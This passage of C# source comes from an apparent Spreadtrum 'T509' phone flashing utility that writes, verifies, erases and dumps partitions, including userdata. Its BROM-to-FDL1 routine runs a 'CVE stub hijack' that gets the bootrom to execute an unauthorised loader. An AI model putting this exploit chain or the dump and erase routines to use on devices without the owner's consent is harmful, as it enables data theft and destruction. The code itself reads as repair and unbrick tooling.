                    token.ThrowIfCancellationRequested();

                    // Read-back verification over the same range.
                    Field(log, "Verify", "reading back...");
                    using var back = new MemoryStream();
                    io.Utils.ReadPartitionCustomize(back, part, (ulong)info.Length);
                    bool match = SameBytes(back, file, token);

                    Rule(log);
                    if (match)
                    {
                        log.LogSuccess(FieldLine("Result", "Done - write verified."));
                        return true;
                    }
                    log.LogWarning(FieldLine("Result", "Failed - verify mismatch"));
                    return false;
                }
                finally
                {
                    io.Utils.UpdatePercentage -= onPct;
                }
            }
            catch (Exception ex)
            {
                Rule(log);
                Field(log, "Result", "Failed - " + Friendly(ex));
                return false;
            }
        }

        /// <summary>Erases the named partitions. This destroys their content.</summary>
        public static int ErasePartitions(ILogSink log, string port,
            IReadOnlyList<string> names, CancellationToken token)
        {
            log ??= NullLogSink.Instance;
            int ok = 0;

            Rule(log);
            Field(log, "Port", port);
            Field(log, "Mode", "download mode (FDL1)");
            Field(log, "Count", names.Count + " selected");
            Rule(log);

            try
            {
                using var io = OpenDownload(port, log, token);
                foreach (string name in names)
                {
                    token.ThrowIfCancellationRequested();
                    string part = (name ?? "").Trim();
                    if (part.Length == 0) continue;

                    try
                    {
                        io.Utils.ErasePartition(part);
                        ok++;
                        Field(log, "Erase", part + " - done");
                    }
                    catch (OperationCanceledException) { throw; }
                    catch (Exception ex)
                    {
                        log.LogWarning(FieldLine("Erase", $"{part} - {Short(ex)}"));
                    }
                }
            }
            catch (Exception ex)
            {
                log.LogWarning(FieldLine("Erase", Friendly(ex)));
            }

            Rule(log);
            string summary = $"{ok}/{names.Count} partitions erased";
            if (ok == names.Count) log.LogSuccess(FieldLine("Result", summary));
            else log.LogWarning(FieldLine("Result", summary));
            return ok;
        }

        /// <summary>Reads every partition in the device's own table into
        /// <paramref name="folder"/>. Includes userdata, so it can be large.</summary>
        public static int DumpAllPartitions(ILogSink log, string port, string folder,
            CancellationToken token)
        {
            log ??= NullLogSink.Instance;

            Rule(log);
            Field(log, "Port", port);
            Field(log, "Mode", "download mode (FDL1)");
            Field(log, "Folder", folder);
            Rule(log);

            try
            {
                using var io = OpenDownload(port, log, token);
                var (parts, method) = io.Utils.GetPartitionsAndStorageInfo();
                token.ThrowIfCancellationRequested();

                Field(log, "Table", method switch
                {
                    GetPartitionsMethod.ConvertExtTable => "EFI user_partition",
                    GetPartitionsMethod.SendReadPartitionPacket => "READ_PARTITION packet",
                    _ => "common-name traversal"
                });

                var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                var list = new List<(string Name, ulong Size)>();
                foreach (var p in parts)
                {
                    string n = (p.Name ?? "").Trim('\0', ' ');
                    if (n.Length == 0 || p.Size == 0 || !seen.Add(n)) continue;
                    list.Add((n, p.Size));
                }

                ulong total = 0;
                foreach (var p in list) total += p.Size;
                Field(log, "Count", $"{list.Count} partitions");
                Field(log, "Total", FormatBytes(total));
                Rule(log);

                int ok = 0;
                foreach (var p in list)
                {
                    token.ThrowIfCancellationRequested();
                    try
                    {
                        string file = Path.Combine(folder, SafeFileName(p.Name) + ".bin");
                        using (var fs = new FileStream(file, FileMode.Create, FileAccess.Write, FileShare.None))
                        {
                            io.Utils.ReadPartitionCustomize(fs, p.Name, p.Size);
                        }
                        ok++;
                        Field(log, "Read", $"{p.Name} - {FormatBytes(p.Size)}");
                    }
                    catch (OperationCanceledException) { throw; }
                    catch (Exception ex)
                    {
                        log.LogWarning(FieldLine("Read", $"{p.Name} - {Short(ex)}"));
                    }
                }

                Rule(log);
                string summary = $"{ok}/{list.Count} partitions dumped";
                if (ok == list.Count) log.LogSuccess(FieldLine("Result", summary));
                else log.LogWarning(FieldLine("Result", summary));
                return ok;
            }
            catch (Exception ex)
            {
                Rule(log);
                log.LogWarning(FieldLine("Result", "Failed - " + Friendly(ex)));
                return 0;
            }
        }

        static string SafeFileName(string name)
        {
            foreach (char bad in Path.GetInvalidFileNameChars())
                name = name.Replace(bad, '_');
            return name;
        }

        static string Short(Exception ex)
        {
            string m = CleanSprd(ex.Message ?? "");
            if (m.Length == 0) m = ex.GetType().Name;
            return m.Length <= 24 ? m : m.Substring(0, 21) + "...";
        }

        /// <summary>
        /// Turns the raw exceptions a dead USB CDC endpoint produces into
        /// something an operator can act on. A wedged BROM/FDL1 node still
        /// enumerates on its COM port, so Windows hands out the handle and
        /// only the first write fails - with "The semaphore timeout period has
        /// expired" or "A device attached to the system is not functioning".
        /// Neither message says what to do; a replug does.
        /// </summary>
        static bool IsPortBusy(Exception ex)
        {
            if (ex == null) return false;
            if (ex is UnauthorizedAccessException) return true;
            if (ex is TimeoutException) return true;
            if (ex is IOException) return true;
            string msg = ex.Message ?? string.Empty;
            return msg.IndexOf("denied", StringComparison.OrdinalIgnoreCase) >= 0 ||
                   msg.IndexOf("access to the path", StringComparison.OrdinalIgnoreCase) >= 0 ||
                   msg.IndexOf("port", StringComparison.OrdinalIgnoreCase) >= 0 && msg.IndexOf("denied", StringComparison.OrdinalIgnoreCase) >= 0;
        }
        static string Clean(string s)
        {
            if (string.IsNullOrEmpty(s)) return s ?? string.Empty;
            var sb = new StringBuilder(s.Length);
            foreach (char c in s)
            {
                if (c < 0x20 || c == 0x7F) { sb.Append(' '); continue; }
                if (c > 0x7E) { /* drop CJK / non-ASCII */ continue; }
                sb.Append(c);
            }
            return sb.ToString().Trim();
        }
        static string Friendly(Exception ex)
        {
            // "Access to the path 'COM15' is denied" is what .NET throws when
            // another handle owns the port - a file-sounding message for a USB
            // problem. Name the real cause.
            if (ex is UnauthorizedAccessException)
                return "port busy - close other tools";

            if ((ex is IOException && ex is not FileNotFoundException) ||
                ex is TimeoutException ||
                ex.InnerException is IOException ||
                ex.InnerException is TimeoutException)
                return "port hung - replug USB";

            return Short(ex);
        }

        static string FormatBytes(ulong bytes)
        {
            string[] units = { "B", "KB", "MB", "GB", "TB" };
            double value = bytes;
            int unit = 0;
            while (value >= 1024 && unit < units.Length - 1)
            {
                value /= 1024;
                unit++;
            }
            return unit == 0 || value >= 100
                ? $"{value:0} {units[unit]}"
                : $"{value:0.#} {units[unit]}";
        }

        static bool SameBytes(Stream readBack, string file, CancellationToken token)
        {
            readBack.Position = 0;
            using var expected = File.OpenRead(file);
            var a = new byte[64 * 1024];
            var b = new byte[64 * 1024];

            while (true)
            {
                token.ThrowIfCancellationRequested();
                int na = readBack.Read(a, 0, a.Length);
                int nb = expected.Read(b, 0, b.Length);
                if (na != nb) return false;
                if (na == 0) return true;
                if (!a.AsSpan(0, na).SequenceEqual(b.AsSpan(0, nb))) return false;
            }
        }

        static void Query(SprdProtocolHandler handler, SprdCommand cmd, string what, ILogSink log)
        {
            try
            {
                var reply = handler.SendPacketAndReceive(cmd);
                string data = reply.Data != null && reply.Data.Length > 0
                    ? BitConverter.ToString(reply.Data).Replace("-", " ")
                    : "(empty)";
                string ascii = ToAscii(reply.Data);
                log.LogInfo($"{what,-12} [{cmd}] -> {reply.Type}" +
                            (ascii.Length > 0 ? $" \"{ascii}\"" : "") +
                            $" {data}");
            }
            catch (Exception ex)
            {
                log.LogDebug($"{what}: not supported on this stage ({ex.GetType().Name}).");
            }
        }

        static string ToAscii(byte[] data)
        {
            if (data == null || data.Length == 0) return "";
            var sb = new StringBuilder();
            foreach (byte b in data)
            {
                if (b >= 0x20 && b < 0x7F) sb.Append((char)b);
                else if (b == 0) break;
            }
            return sb.ToString().Trim();
        }

        // =================================================================
        //  Chain: BROM -> FDL1
        // =================================================================
        static Session BringUpFdl1(ILogSink log, string port, CancellationToken token,
            int bromWaitSeconds = 45)
        {
            var paths = PathManager.Instance;
            // T509 loader paths take priority for T509 devices
            string fdl1Path = paths.GetFdl1Path();
            if (!File.Exists(fdl1Path) || new FileInfo(fdl1Path).Length == 0)
            {
                fdl1Path = paths.GetT509Fdl1Path();
            }
            if (!File.Exists(fdl1Path) || new FileInfo(fdl1Path).Length == 0)
            {
                throw new FileNotFoundException("FDL1 not found: " + fdl1Path);
            }

            var handler = new SprdProtocolHandler(port, new HdlcEncoder(), BROM_BAUD)
            {
                Verbose = false
            };
            var utils = new SprdFlashUtils(handler, m => { /* SPRD handshake traces suppressed for clean logs */ })
            {
                Timeout = 5000
            };

            bool keep = false;
            try
            {
                var stages = utils.ConnectToDevice();
                Field(log, "Stage", $"{stages.Stage} ({stages.SprdMode})");

                // Already in download mode - reuse the live session.
                if (stages.Stage == Stages.Fdl1)
                {
                    keep = true;
                    Field(log, "Session", "live FDL1 reused - no upload");
                    return new Session
                    {
                        Handler = handler,
                        Utils = utils,
                        Port = port,
                        Stage = stages.Stage,
                        SprdMode = stages.SprdMode
                    };
                }

                if (stages.Stage != Stages.Brom)
                    throw new InvalidOperationException(
                        $"device is already in {stages.Stage} - power-cycle into BROM and retry");

                // Full BROM -> FDL1 takeover (merged-source sequence):
                // SendFile FDL1 WITH END_DATA, SendFile stub WITHOUT END_DATA,
                // dispose handle, quiet settle, handshake on fresh handles.
                // Everything on ONE handler - don't dispose/recreate mid-takeover.
                Field(log, "Takeover", "BROM -> FDL1 (CVE)");

                try
                {
                    // SendFile streams directly from disk - no byte[] copy,
                    // faster and matches the merged-source chain exactly.
                    using (var fs = File.OpenRead(fdl1Path))
                        utils.SendFile(fs, FDL1_ADDR, UPLOAD_BLOCK);
                    token.ThrowIfCancellationRequested();

                    byte[] stub = LoadStub(paths, NullLogSink.Instance);
                    using (var ms = new MemoryStream(stub, writable: false))
                        utils.SendFile(ms, STUB_ADDR, UPLOAD_BLOCK, sendEndData: false);
                    Field(log, "Stub", "hijack fired - loader running");
                }
                finally
                {
                    // Dispose AFTER both uploads - the stub hijack fires
                    // inside the last MIDST_DATA block, so we must not close
                    // the handle before that completes.
                    try { utils.Handler.Dispose(); } catch { }
                }

                // Quiet settle (loader inits DRAM/clocks + re-enumerates USB).
                Field(log, "Settle", "12s - loader is starting (quiet)");
                Thread.Sleep(12000);
                token.ThrowIfCancellationRequested();

                // Handshake FDL1 on fresh handles: CHECK_BAUD + CONNECT.
                // VER is a healthy CHECK_BAUD answer (only BROM answers it).
                Session hs = null;
                var hsEnd = DateTime.UtcNow.AddSeconds(Math.Max(30, bromWaitSeconds));
                Exception lastErr = null;
                while (DateTime.UtcNow < hsEnd && hs == null)
                {
                    token.ThrowIfCancellationRequested();
                    SprdProtocolHandler h = null;
                    try
                    {
                        h = new SprdProtocolHandler(port, new HdlcEncoder(), BROM_BAUD)
                        {
                            Verbose = false,
                            Retries = 1
                        };
                        var u = new SprdFlashUtils(h, m => { /* quiet handshake */ })
                        {
                            Timeout = 1500
                        };
                        var st = u.ConnectToDevice();
                        if (st.Stage == Stages.Brom)
                            throw new TimeoutException("device still BROM");
                        u.Timeout = 5000;
                        hs = new Session { Handler = h, Utils = u, Port = port, Stage = st.Stage, SprdMode = st.SprdMode };
                        Field(log, "Reconnect", port + " (same port)");
                        Field(log, "Stage now", st.Stage.ToString());
                    }
                    catch (Exception ex)
                    {
                        lastErr = ex;
                        log.LogDebug("hs: " + Clean(ex.Message));
                        try { h?.Dispose(); } catch { }
                        Thread.Sleep(1500);
                    }
                }

                if (hs == null)
                {
                    resultError(lastErr, log, "device stayed in BROM");
                    throw new InvalidOperationException(
                        "takeover failed - " + (lastErr != null ? lastErr.Message : "no answer"));
                }

                keep = true;
                handler = hs.Handler;
                Field(log, "Session", "FDL1 established - no upload");
                return hs;
            }
            finally
            {
                if (!keep) try { handler?.Dispose(); } catch { }
            }
        }

        static void resultError(Exception lastErr, ILogSink log, string fallback)
        {
            if (lastErr != null)
                log.LogError("ERR: " + Clean(lastErr.GetType().Name) + " - " + Clean(lastErr.Message));
            else
                log.LogError("ERR: " + fallback);
        }

        /// <summary>
        /// Opens a live FDL1 session on <paramref name="port"/>.
        ///
        /// Right after the CVE hijack the loader re-enumerates USB and Windows
        /// can still hold the previous COM handle for a moment, so one open
        /// attempt fails with <see cref="UnauthorizedAccessException"/> - whose
        /// message, "Access to the path 'COM15' is denied", reads like a file
        /// problem. Retry until the handle is released and the stage is no
        /// longer BROM instead of failing the whole flash.
        /// </summary>
        static Session OpenSession(string port, ILogSink log, CancellationToken token,
            int attempts = 10, int delayMs = 1500)
        {
            Exception last = null;
            var end = DateTime.UtcNow.AddSeconds(30);

            for (int attempt = 0; attempt < attempts; attempt++)
            {
                token.ThrowIfCancellationRequested();
                SprdProtocolHandler handler = null;
                try
                {
                    handler = new SprdProtocolHandler(port, new HdlcEncoder(), BROM_BAUD)
                    {
                        Verbose = false
                    };
                    var utils = new SprdFlashUtils(handler, m => { /* quiet reopen */ })
                    {
                        Timeout = 5000
                    };
                    var stages = utils.ConnectToDevice();

                    // The loader is still initialising: try again instead of
                    // handing a BROM session to a flash job.
                    if (stages.Stage == Stages.Brom)
                        throw new TimeoutException("still BROM");

                    return new Session
                    {
                        Handler = handler,
                        Utils = utils,
                        Port = port,
                        Stage = stages.Stage,
                        SprdMode = stages.SprdMode
                    };
                }
                catch (Exception ex)
                {
                    last = ex;
                    try { handler?.Dispose(); } catch { }
                    log.LogDebug($"open {port} ({attempt + 1}/{attempts}): {Clean(ex.Message)}");
                    if (attempt == attempts - 1 || DateTime.UtcNow > end) break;
                    Sleep(delayMs, token);
                }
            }

            throw new InvalidOperationException(
                $"port {port} not usable - {Friendly(last ?? new IOException("no answer"))}", last);
        }

        static Session HandshakeFdl1(string port, int seconds, ILogSink log, CancellationToken token)
        {
            var end = DateTime.UtcNow.AddSeconds(Math.Min(seconds, 120));
            Exception last = null;

            // After the CVE hijack the loader re-enumerates USB. Windows needs
            // a few seconds to release the old COM handle and assign a new one.
            // Do not hammer the port immediately - give the OS time to settle.
            Sleep(3000, token);
            token.ThrowIfCancellationRequested();

            while (DateTime.UtcNow < end)
            {
                token.ThrowIfCancellationRequested();

                // Scan ALL COM ports, not just Spreadtrum ones. During the
                // re-enumeration window the device may appear with a different
                // VID/PID or under a new COM number. ConnectToDevice will prove
                // whether it is actually FDL1.
                var candidates = new List<string> { port };
                try
                {
                    foreach (string p in SerialPort.GetPortNames().Distinct())
                        if (!p.Equals(port, StringComparison.OrdinalIgnoreCase))
                            candidates.Add(p);
                }
                catch { /* keep the preferred port only */ }

                foreach (string cand in candidates)
                {
                    token.ThrowIfCancellationRequested();
                    SprdProtocolHandler handler = null;
                    bool keep = false;
                    try
                    {
                        handler = new SprdProtocolHandler(cand, new HdlcEncoder(), BROM_BAUD)
                        {
                            Verbose = false,
                            Retries = 1
                        };
                        var utils = new SprdFlashUtils(handler, m => { /* SPRD handshake traces suppressed for clean logs */ })
                        {
                            Timeout = 1500
                        };

                        var st = utils.ConnectToDevice();
                        if (st.Stage == Stages.Brom)
                            throw new TimeoutException("device is still BROM");

                        utils.Timeout = 5000;
                        keep = true;
                        log.LogDebug($"FDL1 answered on {cand}.");
                        return new Session
                        {
                            Handler = handler,
                            Utils = utils,
                            Port = cand,
                            Stage = st.Stage,
                            SprdMode = st.SprdMode
                        };
                    }
                    catch (Exception ex)
                    {
                        last = ex;
                        string msg = Clean(ex.Message);
                        // "semaphore timeout" / "access denied" = stale handle,
                        // silently try the next port - do not flood the UI log.
                        if (msg.Contains("denied", StringComparison.OrdinalIgnoreCase) ||
                            msg.Contains("semaphore", StringComparison.OrdinalIgnoreCase))
                        {
                            // Silent retry - Windows is still releasing the handle.
                        }
                        else
                        {
                            log.LogDebug($"FDL1 not up yet on {cand} - trying next...");
                        }
                    }
                    finally
                    {
                        if (!keep && handler != null)
                            try { handler.Dispose(); } catch { }
                    }
                }

                // Wait 2s before rescanning - Windows may still be releasing
                // the old handle or assigning a new COM number.
                Sleep(2000, token);
            }

            throw new TimeoutException($"FDL1 never answered ({last?.Message})");
        }

        // =================================================================
        //  Chain: FDL1 -> FDL2
        // =================================================================
        /// <summary>
        /// BSL download with tuned knobs: tunable block size (fewer round-trips
        /// on a flapping link) and an inter-chunk gap (lets marginal USB/power
        /// recover between bursts), plus progress logging so the stall point
        /// is visible. Matches the merged-source chain exactly.
        /// </summary>
        static void SendFileTuned(SprdFlashUtils utils, string filePath, uint addr,
            int blk, int gapMs, ILogSink log, string what, CancellationToken token)
        {
            using var fs = File.OpenRead(filePath);
            long total = fs.Length;
            if (blk < 528) blk = 528;
            if (blk > 0xFFFF) blk = 0xFFFF;
            byte[] header = new byte[8];
            header[0] = (byte)(addr >> 24); header[1] = (byte)(addr >> 16);
            header[2] = (byte)(addr >> 8); header[3] = (byte)addr;
            uint len = (uint)total;
            header[4] = (byte)(len >> 24); header[5] = (byte)(len >> 16);
            header[6] = (byte)(len >> 8); header[7] = (byte)len;
            var h = utils.Handler;
            var t = h.SendPacketAndReceive(BSL_CMD_START_DATA, header).Type;
            if (t != BSL_REP_ACK) throw new UnexpectedResponseException(t);
            byte[] buf = new byte[blk];
            long sent = 0;
            int lastPct = -1;
            fs.Position = 0;
            while (sent < total)
            {
                token.ThrowIfCancellationRequested();
                int n = (int)Math.Min(blk, total - sent);
                fs.ReadExactly(buf, 0, n);
                token.ThrowIfCancellationRequested();
                t = h.SendPacketAndReceive(BSL_CMD_MIDST_DATA, buf.AsMemory(0, n)).Type;
                if (t != BSL_REP_ACK) throw new UnexpectedResponseException(t);
                sent += n;
                int pct = (int)(sent * 100 / total);
                if (pct != lastPct && pct % 10 == 0)
                {
                    lastPct = pct;
                    Field(log, what, $"sending {pct}% ({sent:N0}/{total:N0} bytes)");
                }
                if (gapMs > 0) Thread.Sleep(gapMs);
            }
            token.ThrowIfCancellationRequested();
            t = h.SendPacketAndReceive(BSL_CMD_END_DATA).Type;
            if (t != BSL_REP_ACK) throw new UnexpectedResponseException(t);
            Field(log, what, "upload complete (" + total + " bytes)");
        }

        static void LoadFdl2(Session session, string fdl2Path, ILogSink log, CancellationToken token)
        {
            int sendTries = 0;
            while (true)
            {
                token.ThrowIfCancellationRequested();
                try
                {
                    // Tuned send: direct SendPacketAndReceive from disk, no
                    // byte[] copy, with progress logging and optional gap.
                    SendFileTuned(session.Utils, fdl2Path, FDL2_ADDR, UPLOAD_BLOCK, 0,
                        log, "FDL2", token);
                    break;
                }
                catch (Exception ex) when (ex is IOException ||
                                           ex is OperationCanceledException ||
                                           ex is SprdException)
                {
                    token.ThrowIfCancellationRequested();
                    if (++sendTries >= 4) throw;
                    log.LogWarning("sending bootloader failed - retrying...");

                    // Close the port first. A dead CDC endpoint cannot be
                    // revived by CHECK_BAUD/CONNECT on the same handle.
                    try { session.Handler?.Dispose(); } catch { }
                    session.Handler = null;

                    Session again = HandshakeFdl1(session.Port, 120, log, token);
                    session.Handler = again.Handler;
                    session.Utils = again.Utils;
                    session.Port = again.Port;
                    session.Stage = again.Stage;
                    session.SprdMode = again.SprdMode;
                }
            }

            // Let FDL1 finalize the received image before EXEC.
            Field(log, "EXEC", "bootloader loaded - starting...");
            Sleep(10000, token);

            // EXEC_DATA jumps FDL1 into FDL2. Treat as best-effort.
            session.Utils.Timeout = 30000;
            try
            {
                session.Utils.ExecuteDataAndConnect(Stages.Fdl1);
                Field(log, "EXEC", "bootloader running.");
            }
            catch (Exception ex) when (ex is IOException || ex is TimeoutException ||
                                       ex is SprdException)
            {
                log.LogWarning("bootloader start not acknowledged - proceeding anyway.");
            }
            session.Utils.Timeout = 15000;
        }

        // =================================================================
        //  Writes
        // =================================================================
        static void WritePartitionOnly(Session session, string name, string path, ILogSink log)
        {
            byte[] blob = File.ReadAllBytes(path);
            Field(log, name, $"writing {blob.Length:N0} bytes");
            using (var ms = new MemoryStream(blob, writable: false))
                session.Utils.WritePartition(name, ms);
            Field(log, name, "written");
        }

        static void TryReset(SprdFlashUtils utils, ILogSink log)
        {
            // The BROM drops USB as soon as it accepts NORMAL_RESET, so the ACK
            // never arrives. The handler answers a missing response with five
            // retries against the read timeout, which at the 30 s session
            // timeout stalled a finished Fix Handshake for ~2.5 minutes. Send
            // the reset frame with a short timeout and never wait on it.
            int previousTimeout = 30000;
            try
            {
                previousTimeout = utils.Timeout;
                utils.Timeout = 250;
                utils.PowerOnDevice();
                log.LogDebug("Reset ACK received.");
            }
            catch (Exception ex)
            {
                // Expected outcome, not a failure: the device is rebooting.
                log.LogDebug($"Reset ACK not received ({ex.GetType().Name}) - device is already rebooting.");
            }
            finally
            {
                try { utils.Timeout = previousTimeout; } catch { }
            }
        }

        /// <summary>
        /// Frames a BSL command with the vendored stack's own encoder and
        /// checksum.
        ///
        /// The raw frames that used to be hand-written here and in
        /// <c>SpdMode</c> (<c>7E 00 05 00 00 FF FA 7E</c> for NORMAL_RESET and
        /// <c>7E 00 17 00 00 00 17 7E</c> for POWER_OFF) carry a made-up
        /// checksum: the 16-bit sum of <c>00 05 00 00</c> is <c>0xFFFA</c>, and
        /// the wire order is the byte-swapped value, i.e. <c>FA FF</c>. The
        /// device rejects the stale frame, so "Exit BROM" / "Power Off" wrote
        /// bytes, got no ACK, and still reported success. Always frame through
        /// the encoder that the upload path already proves.
        /// </summary>
        public static byte[] BuildCommandFrame(SprdCommand command, byte[] payload = null)
            => new HdlcEncoder().Encode(command, payload ?? Array.Empty<byte>(), SprdChecksum.Instance);

        // =================================================================
        //  Log formatting - simple, clean, user-friendly
        // =================================================================
        const int FieldLabelWidth = 12;
        const string FieldRule = "───────────────────────────────────────────";
        const int FieldMaxWidth = 43;

        static string FieldLine(string label, string value)
        {
            string line = label.PadRight(FieldLabelWidth) + ": " + value;
            return line.Length <= FieldMaxWidth
                ? line
                : line.Substring(0, FieldMaxWidth - 3) + "...";
        }

        static void Field(ILogSink log, string label, string value) =>
            log.LogInfo(FieldLine(label, value));

        static void Rule(ILogSink log) => log.LogInfo(FieldRule);

        /// <summary>Plain-language step label for non-technical users.</summary>
        static string Step(string what) => what switch
        {
            "connect" => "connecting to device...",
            "upload" => "sending boot file...",
            "stub" => "unlocking boot mode...",
            "reset" => "restarting device...",
            "done" => "done.",
            "fail" => "failed.",
            _ => what
        };

        // =================================================================
        //  BROM entry command trace
        //
        //  The pane is 46 columns wide, so the sequence is printed as a compact
        //  table instead of raw hex dumps. Repeats are collapsed ("ACK x104")
        //  to keep a 53 KB upload to a single readable row.
        // =================================================================
        sealed class CmdTrace
        {
            readonly List<(string Name, string Op, string Reply, int Count)> _rows = new();

            public bool Any => _rows.Count > 0;

            public void Add(SprdCommand cmd, Packet reply)
            {
                string name = Trim(cmd.ToString(), "BSL_CMD_");
                string op = "0x" + ((ushort)cmd).ToString("X2");
                string rep = ReplyName(reply.Type);

                if (_rows.Count > 0)
                {
                    var last = _rows[_rows.Count - 1];
                    if (last.Name == name && last.Op == op && last.Reply == rep)
                    {
                        _rows[_rows.Count - 1] = (last.Name, last.Op, last.Reply, last.Count + 1);
                        return;
                    }
                }
                _rows.Add((name, op, rep, 1));
            }

            public void Emit(ILogSink log)
            {
                if (_rows.Count == 0) return;
                try
                {
                    log.LogInfo("BROM ENTRY COMMANDS");
                    log.LogInfo($"{"#",2}  {"COMMAND",-17} {"OP",-4}  REPLY");
                    int i = 0;
                    foreach (var r in _rows)
                    {
                        string name = r.Name.Length > 17 ? r.Name.Substring(0, 17) : r.Name;
                        string rep = r.Count > 1 ? r.Reply + " x" + r.Count : r.Reply;
                        log.LogInfo($"{++i,2}  {name,-17} {r.Op,-4}  {rep}");
                    }
                }
                catch { }
            }

            static string Trim(string value, string prefix) =>
                value.StartsWith(prefix, StringComparison.Ordinal)
                    ? value.Substring(prefix.Length)
                    : value;

            static string ReplyName(SprdCommand type) => type switch
            {
                BSL_REP_ACK => "ACK",
                BSL_REP_VER => "VER",
                BSL_REP_VERIFY_ERROR => "VERIFY ERR",
                BSL_REP_UNSUPPORTED_COMMAND => "UNSUPPORTED",
                BSL_REP_INVALID_CMD => "INVALID",
                BSL_REP_OPERATION_FAILED => "OP FAILED",
                _ => Trim(type.ToString(), "BSL_REP_")
            };
        }

        // =================================================================
        //  Upload
        // =================================================================
        static void Upload(SprdFlashUtils utils, byte[] data, uint address, string what,
            bool sendEndData, ILogSink log, CancellationToken token)
        {
            var handler = utils.Handler;

            byte[] header = new byte[8];
            BinaryPrimitives.WriteUInt32BigEndian(header.AsSpan(0, 4), address);
            BinaryPrimitives.WriteUInt32BigEndian(header.AsSpan(4, 4), (uint)data.Length);

            var reply = handler.SendPacketAndReceive(BSL_CMD_START_DATA, header).Type;
            if (reply != BSL_REP_ACK) throw new UnexpectedResponseException(reply);

            int lastPct = -10;
            for (int sent = 0; sent < data.Length;)
            {
                token.ThrowIfCancellationRequested();
                int n = Math.Min(UPLOAD_BLOCK, data.Length - sent);
                reply = handler.SendPacketAndReceive(BSL_CMD_MIDST_DATA,
                    data.AsMemory(sent, n)).Type;
                if (reply != BSL_REP_ACK) throw new UnexpectedResponseException(reply);
                sent += n;

                int pct = (int)((long)sent * 100 / data.Length);
                if (data.Length > 4096 && pct / 10 != lastPct / 10)
                {
                    lastPct = pct;
                    Field(log, what, $"sending {pct}%...");
                }
            }

            if (sendEndData)
            {
                reply = handler.SendPacketAndReceive(BSL_CMD_END_DATA).Type;
                if (reply != BSL_REP_ACK) throw new UnexpectedResponseException(reply);
                Field(log, what, "sent.");
            }
            else
            {
                Field(log, what, "sent.");
            }
        }

        // =================================================================
        //  Payload resolution
        // =================================================================
        static byte[] LoadFdl1(PathManager paths, ILogSink log, out string source, bool preferDownloadBuild = false)
        {
            // Two builds of the same SPL family, both stored in
            // loaders\T509:
            //   - T509_Fix.bin (66,875 B capture, SPL @0x5500): boot build.
            //     Used by Fix Handshake, which executes the SPL and lets the
            //     device boot Android.
            //   - fdl1-dl.bin (53,064 B): download build. Stays in FDL1 after
            //     the hijack - required for partition writes.
            string download = paths.GetFdl1Path();
            string fix = paths.GetFixPath();

            if (preferDownloadBuild && File.Exists(download) && new FileInfo(download).Length > 0)
            {
                source = Path.GetFileName(download);
                log.LogDebug($"FDL1: {download} ({new FileInfo(download).Length:N0} bytes) [download build]");
                return File.ReadAllBytes(download);
            }

            if (File.Exists(fix))
            {
                try
                {
                    byte[] fromCapture = LoadFixSplFromLoader(paths, log, fix);
                    source = Path.GetFileName(fix);
                    log.LogDebug($"FDL1: {fix} ({fromCapture.Length:N0} bytes @ 0x{FDL1_ADDR:X}) [boot build]");
                    return fromCapture;
                }
                catch (Exception ex) when (ex is not OperationCanceledException)
                {
                    log.LogDebug($"Capture unusable ({ex.GetType().Name}) - using fdl1-dl.bin");
                }
            }

            if (File.Exists(download) && new FileInfo(download).Length > 0)
            {
                source = Path.GetFileName(download);
                log.LogDebug($"FDL1: {download} ({new FileInfo(download).Length:N0} bytes)");
                return File.ReadAllBytes(download);
            }

            source = "none";
            throw new FileNotFoundException("fdl1 missing");
        }
        /// <summary>SPL captured in T509_Fix.bin (0x5500, &gt;0x1000 bytes).</summary>
        public static byte[] LoadFixSpl(PathManager paths, ILogSink log)
        {
            string fix = paths.GetT509FixPath();
            if (!File.Exists(fix))
            {
                // Short reason: the log pane clips at 43 columns, so the full
                // path would be cut in the middle of the message.
                log.LogDebug($"Loader missing: {fix}");
                throw new FileNotFoundException("fdl1 missing");
            }

            var blobs = T509FlashService.ParseFixBin(fix);
            var spl = blobs.FirstOrDefault(b => b.Address == FDL1_ADDR && b.Data.Length > 0x1000);
            if (spl == null)
                throw new InvalidDataException("T509_Fix.bin has no usable SPL payload at 0x5500.");

            log.LogDebug($"SPL: {fix} ({spl.Data.Length:N0} bytes)");
            // Uploaded verbatim: the proven capture sends the DHTB container
            // as-is (its entry point is resolved inside the image), so the
            // header must NOT be stripped here - and this same blob is what
            // FlashSplloaderOnly writes back to the splloader partition.
            return spl.Data;
        }

        /// <summary>Load SPL from the T509 loader path.</summary>
        public static byte[] LoadFixSplFromLoader(PathManager paths, ILogSink log, string fixPath = null)
        {
            string fix = fixPath ?? paths.GetFixPath();
            if (!File.Exists(fix))
            {
                log.LogDebug($"SPL missing: {fix}");
                throw new FileNotFoundException("fdl1 missing");
            }

            var blobs = T509FlashService.ParseFixBin(fix);
            var spl = blobs.FirstOrDefault(b => b.Address == FDL1_ADDR && b.Data.Length > 0x1000);
            if (spl == null)
                throw new InvalidDataException("T509_Fix.bin has no usable SPL payload at 0x5500.");

            log.LogDebug($"SPL: {fix} ({spl.Data.Length:N0} bytes)");
            return spl.Data;
        }

        static byte[] LoadStub(PathManager paths, ILogSink log)
        {
            // The 128-byte CVE stub is its own asset now. T509_Fix.bin was only
            // the capture it was cut from, so the takeover no longer depends on
            // that file - which is why deleting it must not break this path.
            string custom = paths.GetT509CustomExecPath();
            if (File.Exists(custom) && new FileInfo(custom).Length > 0)
            {
                log.LogDebug($"Stub: {custom} ({new FileInfo(custom).Length:N0} bytes)");
                return File.ReadAllBytes(custom);
            }

            // Optional fallback: an operator can still drop in the capture.
            string fix = paths.GetT509FixPath();
            if (File.Exists(fix))
            {
                var embedded = T509FlashService.ParseFixBin(fix)
                    .FirstOrDefault(b => b.Address == STUB_ADDR && b.Data.Length > 0);
                if (embedded != null)
                {
                    log.LogDebug($"Stub: {fix} (embedded {embedded.Data.Length:N0} bytes)");
                    return embedded.Data;
                }
            }

            log.LogDebug($"Stub missing: {custom}");
            throw new FileNotFoundException("stub missing");
        }

        // =================================================================
        //  Port helpers
        // =================================================================
        static string ResolvePort(string port, ILogSink log, CancellationToken token, int seconds = 30)
        {
            if (!string.IsNullOrWhiteSpace(port))
                return port;

            log.LogInfo("No port selected - looking for the BROM node...");
            return T509FlashService.FindBromPort(seconds);
        }

        static string WaitForBrom(int seconds, ILogSink log, CancellationToken token)
        {
            var end = DateTime.UtcNow.AddSeconds(seconds);
            DateTime lastNote = DateTime.UtcNow;

            while (DateTime.UtcNow < end)
            {
                token.ThrowIfCancellationRequested();

                foreach (string p in SerialPort.GetPortNames().Distinct())
                {
                    try
                    {
